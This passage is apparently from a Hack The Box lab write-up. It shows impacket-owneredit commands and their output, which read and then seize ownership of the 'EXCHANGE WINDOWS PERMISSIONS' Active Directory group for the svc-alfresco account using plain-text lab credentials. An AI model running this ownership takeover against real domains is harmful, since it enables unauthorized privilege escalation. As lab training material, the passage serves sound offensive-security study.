## -action read
```sh
└─$ impacket-owneredit -ts -debug -dc-ip 10.129.240.125 -target 'EXCHANGE WINDOWS PERMISSIONS' -action read 'htb.local/svc-alfresco:s3rvice'            
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-09-23 20:40:47] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-09-23 20:40:51] [+] Initializing domainDumper()
[2025-09-23 20:40:51] [+] Target principal found in LDAP (EXCHANGE WINDOWS PERMISSIONS)
[2025-09-23 20:40:51] [*] Current owner information below
[2025-09-23 20:40:51] [*] - SID: S-1-5-21-3072663084-364016917-1341370565-512
[2025-09-23 20:40:52] [*] - sAMAccountName: Domain Admins
[2025-09-23 20:40:52] [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=htb,DC=local
```

## -action write
```sh
└─$ impacket-owneredit -ts -debug -dc-ip 10.129.240.125 -new-owner 'svc-alfresco' -target 'EXCHANGE WINDOWS PERMISSIONS' -action write 'htb.local/svc-alfresco:s3rvice'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-09-23 20:41:38] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-09-23 20:41:42] [+] Initializing domainDumper()
[2025-09-23 20:41:42] [+] Target principal found in LDAP (EXCHANGE WINDOWS PERMISSIONS)
[2025-09-23 20:41:43] [+] Found new owner SID: S-1-5-21-3072663084-364016917-1341370565-1147
[2025-09-23 20:41:43] [*] Current owner information below
[2025-09-23 20:41:43] [*] - SID: S-1-5-21-3072663084-364016917-1341370565-512
[2025-09-23 20:41:43] [*] - sAMAccountName: Domain Admins
[2025-09-23 20:41:43] [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=htb,DC=local
[2025-09-23 20:41:43] [+] Attempt to modify the OwnerSid
[2025-09-23 20:41:43] [*] OwnerSid modified successfully!
                                                                                  

└─$ impacket-owneredit -ts -debug -dc-ip 10.129.240.125 -target 'EXCHANGE WINDOWS PERMISSIONS' -action read 'htb.local/svc-alfresco:s3rvice'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-09-23 20:41:50] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-09-23 20:41:54] [+] Initializing domainDumper()
[2025-09-23 20:41:54] [+] Target principal found in LDAP (EXCHANGE WINDOWS PERMISSIONS)
[2025-09-23 20:41:54] [*] Current owner information below
[2025-09-23 20:41:54] [*] - SID: S-1-5-21-3072663084-364016917-1341370565-1147
[2025-09-23 20:41:54] [*] - sAMAccountName: svc-alfresco
[2025-09-23 20:41:54] [*] - distinguishedName: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
```
